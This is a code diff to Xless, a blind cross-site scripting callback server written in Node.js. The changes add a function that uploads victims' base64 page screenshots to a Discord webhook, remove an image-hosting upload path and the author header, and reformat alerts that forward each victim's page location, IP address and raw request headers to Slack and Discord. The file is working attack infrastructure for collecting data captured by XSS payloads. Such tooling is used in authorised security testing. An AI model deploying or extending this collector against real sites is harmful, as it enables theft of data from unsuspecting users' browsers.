@@ -1,7 +1,3 @@
-// Xless: The Serverlesss Blind XSS App.
-// Version: v1.2
-// Author: Mazin Ahmed <mazin@mazinahmed.net>
-
 const express = require("express");
 var bodyParser = require("body-parser");
 var cors = require("cors");
@@ -31,6 +27,32 @@ app.use(function (req, res, next) {
     next();
 });
 
+function sendBase64ImageToDiscord(base64Image) {
+    try {
+        var imageBuffer = Buffer.from(base64Image, "base64");
+
+        request.post({
+            url: discord_incoming_webhook,
+            formData: {
+                file: {
+                    value: imageBuffer,
+                    options: {
+                        filename: "screenshot.png"
+                    }
+                }
+            }
+        }, function (error, response, body) {
+            if (!error && response.statusCode == 200) {
+                console.log('Webhook sent successfully:', body);
+            } else {
+                console.error('Error sending webhook:', error || body);
+            }
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
 function generate_blind_xss_alert(body) {
     var alert = "*XSSless: Blind XSS Alert*\n";
     for (let k of Object.keys(body)) {
@@ -49,8 +71,8 @@ function generate_blind_xss_alert(body) {
 
 function generate_callback_alert(headers, data, url) {
     var alert = ":rotating_light: **Out-of-Band Callback Received!**\n\n";
-    alert += `**IP Address           |** \`${data["Remote IP"]}\`\n`;
-    alert += `**Request URI         |** \`${url}\`\n`;
+    alert += `**IP Address      |** \`${data["Remote IP"]}\`\n`;
+    alert += `**Request URI     |** \`${url}\`\n`;
     alert += `**Raw Headers**\n\`\`\``
     // Add all the headers
     for (var key in headers) {
@@ -126,28 +148,12 @@ app.all("/message", (req, res) => {
 app.post("/c", async (req, res) => {
     let data = req.body;
 
-    var location = "*XSSless: Blind XSS Alert*\n";
-    location += `• *Location:* \`${data["Location"]}\`\n`;
+    var location = ":rocket: **Blind XSS Triggered**\n";
+    location += `**Location     |** \`${data["Location"]}\`\n`;
 
     // Upload our screenshot and only then send the Slack alert
     data["Screenshot URL"] = "";
 
-    if (imgbb_api_key && data["Screenshot"]) {
-        const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
-
-        try {
-            const imgRes = await uploadImage(encoded_screenshot);
-            const imgOut = JSON.parse(imgRes);
-            if (imgOut.error) {
-                data["Screenshot URL"] = "NA";
-            } else if (imgOut.data && imgOut.data.url_viewer) {
-                // Add the URL to our data array so it will be included on our Slack message
-                data["Screenshot URL"] = imgOut.data.url_viewer;
-            }
-        } catch (e) {
-            data["Screenshot URL"] = e.message;
-        }
-    }
 
     // Now handle the regular Slack alert
     data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
@@ -165,6 +171,13 @@ app.post("/c", async (req, res) => {
         request.post(slack_incoming_webhook, data, (out) => {
             console.log("[!] XSS blind payload triggered! Data sent to slack.");
         });
+    }
+
+    // send screenshot
+    if (data["Screenshot"]) {
+        const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
+
+        sendBase64ImageToDiscord(encoded_screenshot)
     }
 
     res.send("ok\n");
